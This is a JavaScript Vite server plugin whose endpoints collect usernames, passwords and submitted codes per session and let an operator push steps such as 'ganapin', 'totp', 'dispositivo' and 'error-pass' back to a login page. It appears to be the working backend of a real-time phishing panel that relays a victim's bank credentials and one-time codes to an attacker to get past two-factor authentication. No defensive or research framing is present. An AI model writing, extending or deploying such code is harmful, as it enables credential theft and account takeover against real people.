function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = []
    req.on('data', (c) => chunks.push(c))
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString('utf8')
        resolve(raw ? JSON.parse(raw) : {})
      } catch (err) {
        reject(err)
      }
    })
    req.on('error', reject)
  })
}

function sendJson(res, status, data) {
  res.statusCode = status
  res.setHeader('Content-Type', 'application/json')
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
  res.end(JSON.stringify(data))
}

/**
 * Shared hub in the Vite process so Chrome ↔ Edge (any browser) sync ops.
 * localStorage / BroadcastChannel only work inside the same browser.
 */
export function opsHubPlugin() {
  /** @type {Map<string, object>} */
  const sessions = new Map()
  /** @type {Array<{ id: string, sessionId: string, action: string, at: number }>} */
  const actions = []
  let actionSeq = 0

  return {
    name: 'ops-hub',
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        const path = req.url?.split('?')[0] || ''
        if (!path.startsWith('/api/ops')) return next()

        if (req.method === 'OPTIONS') {
          return sendJson(res, 204, {})
        }

        try {
          if (path === '/api/ops/sessions' && req.method === 'GET') {
            const list = [...sessions.values()].sort(
              (a, b) => (a.createdAt || 0) - (b.createdAt || 0),
            )
            return sendJson(res, 200, { sessions: list })
          }

          if (path === '/api/ops/sessions' && req.method === 'POST') {
            const body = await readBody(req)
            if (!body?.id) return sendJson(res, 400, { error: 'id required' })
            const prev = sessions.get(body.id) || {}
            const nextSession = {
              ...prev,
              ...body,
              id: body.id,
              username: body.username ?? body.user ?? prev.username ?? '',
              password: body.password ?? body.clave ?? prev.password ?? '',
              user: body.username ?? body.user ?? prev.user ?? '',
              clave: body.password ?? body.clave ?? prev.clave ?? '',
              createdAt: body.createdAt || prev.createdAt || Date.now(),
              last_seen: body.last_seen || Date.now(),
              updatedAt: Date.now(),
              state: body.state || body.status || prev.state || 'waiting',
              token: body.token ?? prev.token ?? '',
            }
            sessions.set(body.id, nextSession)
            return sendJson(res, 200, { ok: true, session: nextSession })
          }

          if (path === '/api/ops/sessions' && req.method === 'DELETE') {
            sessions.clear()
            actions.length = 0
            return sendJson(res, 200, { ok: true })
          }

          if (path === '/api/ops/session' && req.method === 'DELETE') {
            const body = await readBody(req)
            const id = body?.id || body?.sessionId
            if (!id) return sendJson(res, 400, { error: 'id required' })
            sessions.delete(id)
            // Mantener actions: el login aún puede leer "done" / "error-pass"
            return sendJson(res, 200, { ok: true })
          }

          if (path === '/api/ops/ping' && req.method === 'POST') {
            const body = await readBody(req)
            const s = sessions.get(body.sessionId)
            if (s) {
              s.last_seen = Date.now()
              s.updatedAt = Date.now()
              sessions.set(body.sessionId, s)
            }
            return sendJson(res, 200, { ok: true })
          }

          if (path === '/api/ops/token' && req.method === 'POST') {
            const body = await readBody(req)
            const s = sessions.get(body.sessionId)
            if (s) {
              s.last_seen = Date.now()
              s.updatedAt = Date.now()
              if (body.typingOnly) {
                // Escribiendo el código: badge, sin revelar token aún
                if (s.state !== 'waiting-token' && s.state !== 'done') {
                  s.state = 'typing'
                }
              } else {
                s.token = body.token || ''
                s.state = body.submitted ? 'waiting-token' : 'typing'
              }
              sessions.set(body.sessionId, s)
            }
            return sendJson(res, 200, { ok: true })
          }

          if (path === '/api/ops/actions' && req.method === 'POST') {
            const body = await readBody(req)
            if (!body?.sessionId || !body?.action) {
              return sendJson(res, 400, { error: 'sessionId and action required' })
            }
            actionSeq += 1
            const entry = {
              id: `a_${actionSeq}_${Date.now()}`,
              sessionId: body.sessionId,
              action: body.action,
              image: typeof body.image === 'string' ? body.image : '',
              at: Date.now(),
            }
            actions.push(entry)
            const s = sessions.get(body.sessionId)
            if (s) {
              const stateMap = {
                ganapin: 'waiting-ganapin',
                totp: 'waiting-totp',
                dispositivo: 'waiting-dispositivo',
                'error-pass': 'error-pass',
                'error-user': 'error-user',
                'error-token': 'error-token',
                done: 'done',
              }
              s.state = stateMap[body.action] || body.action
              if (entry.image) s.securityImage = entry.image
              s.updatedAt = Date.now()
              sessions.set(body.sessionId, s)
            }
            return sendJson(res, 200, { ok: true, action: entry })
          }

          if (path === '/api/ops/actions' && req.method === 'GET') {
            const qs = new URL(req.url, 'http://localhost').searchParams
            const sessionId = qs.get('sessionId')
            const since = Number(qs.get('since') || 0)
            let list = actions.filter((a) => a.at > since)
            if (sessionId) list = list.filter((a) => a.sessionId === sessionId)
            // La imagen vive en la sesión; no reenviar dataURLs enormes en cada poll
            return sendJson(res, 200, {
              actions: list.map((a) => ({
                id: a.id,
                sessionId: a.sessionId,
                action: a.action,
                image: '',
                at: a.at,
              })),
            })
          }

          return sendJson(res, 404, { error: 'not found' })
        } catch (err) {
          return sendJson(res, 500, { error: String(err?.message || err) })
        }
      })
    },
  }
}
